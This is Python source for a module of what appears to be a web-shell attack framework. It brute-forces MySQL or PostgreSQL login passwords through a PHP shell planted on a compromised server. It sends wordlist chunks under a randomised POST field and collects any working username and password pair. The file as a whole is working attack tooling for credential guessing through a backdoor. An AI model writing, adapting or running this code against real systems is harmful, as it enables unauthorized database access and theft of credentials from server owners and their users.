from core.moduleprobe import ModuleProbe
from core.moduleexception import ProbeException
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
from ast import literal_eval
from argparse import SUPPRESS
from os import sep
from string import ascii_lowercase
from random import choice
from re import compile

WARN_CHUNKSIZE_TOO_BIG = 'Reduce it bruteforcing remote hosts to speed up the process' 
WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_NO_WORDLIST = 'Impossible to load a valid word list, use -wordfile or -wordlist'
WARN_NOT_CALLABLE = 'Function not callable, use -dbms to change db management system'


def chunks(l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

def uniq(seq):
    seen = set()
    seen_add = seen.add
    return [ x for x in seq if x not in seen and not seen_add(x)]

class Sql(ModuleProbe):
    """ Bruteforce SQL username"""
    
    support_vectors = VectorList([
            Vector('shell.php', 'check_connect', "(is_callable('$dbms_connect') && print(1)) || print(0);"),
            Vector('shell.php', 'mysql', [ """ini_set('mysql.connect_timeout',1);
foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
$c=@mysql_connect("$hostname", "$username", "$pwd");
if($c){
print("+ $username:" . $pwd . "\n");
break;
}
}mysql_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),
            Vector('shell.php', 'postgres', [ """foreach(split('[\n]+',$_POST["$post_field"]) as $pwd) {
$c=@pg_connect("host=$hostname user=$username password=" . $pwd . " connect_timeout=1");
if($c){
print("+ $username:" . $pwd . "\n");
break;
}
}pg_close();""", "-post", "{\'$post_field\' : \'$data\' }"]),                                  
                                  
            ])
    
    
    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('username', help='SQL username to bruteforce')
    argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
    argparser.add_argument('-wordfile', help='Local wordlist path')
    argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
    argparser.add_argument('-chunksize', type=int, default=5000)
    argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=literal_eval, default=[])
    argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')

    def _prepare_probe(self):
        
        
        # Check chunk size
        if (self.args['hostname'] not in ('127.0.0.1', 'localhost')) and self.args['chunksize'] > 20:
            self.mprint('Chunk size %i: %s' % (self.args['chunksize'], WARN_CHUNKSIZE_TOO_BIG))
            
        # Load wordlist
        wordlist = self.args['wordlist']
        if not wordlist:
            if self.args['wordfile']:
                try:
                    local_file = open(self.args['wordfile'], 'r')
                except Exception, e:
                    raise ProbeException(self.name,  '\'%s\' %s' % (self.args['wordfile'], WARN_NO_SUCH_FILE))
                else:
                    wordlist = local_file.read().split('\n')
                    
        # If loaded, cut it from startline
        if not wordlist:
            raise ProbeException(self.name, WARN_NO_WORDLIST)   
        else:
            wordlist = wordlist[self.args['startline']:]
            
        # Clean it
        wordlist = filter(None, uniq(wordlist))
            
        # Then divide in chunks
        chunksize = self.args['chunksize']
        wlsize = len(wordlist)
        if chunksize > 0 and wlsize > chunksize:
            self.args['wordlist'] = chunks(wordlist, chunksize)
        else:
            self.args['wordlist'] = [ wordlist ]
            
    
    def _probe(self):
        
        dbms_connect = 'mysql_connect' if self.args['dbms'] == 'mysql' else 'pg_connect'
        
        if self.support_vectors.get('check_connect').execute(self.modhandler, { 'dbms_connect' : dbms_connect }) != '1':
            raise ProbeException(self.name,  '\'%s\' %s' % (dbms_connect, WARN_NOT_CALLABLE))
        
        post_field = ''.join(choice(ascii_lowercase) for x in range(4))
        user_pwd_re = compile('\+ (.+):(.+)$')
        
        
        for chunk in self.args['wordlist']:
            
            joined_chunk='\\n'.join(chunk)
            args_formats = { 'hostname' : self.args['hostname'], 'username' : self.args['username'], 'post_field' : post_field, 'data' : joined_chunk }
            self.mprint("From '%s' to '%s'..." % (chunk[0], chunk[-1]))
            result = self.support_vectors.get(self.args['dbms']).execute(self.modhandler, args_formats)  
            if result:
                user_pwd_matched = user_pwd_re.findall(result)
                if user_pwd_matched and len(user_pwd_matched[0]) == 2:
                    self._result = [ user_pwd_matched[0][0], user_pwd_matched[0][1]]
                    
                    
                
                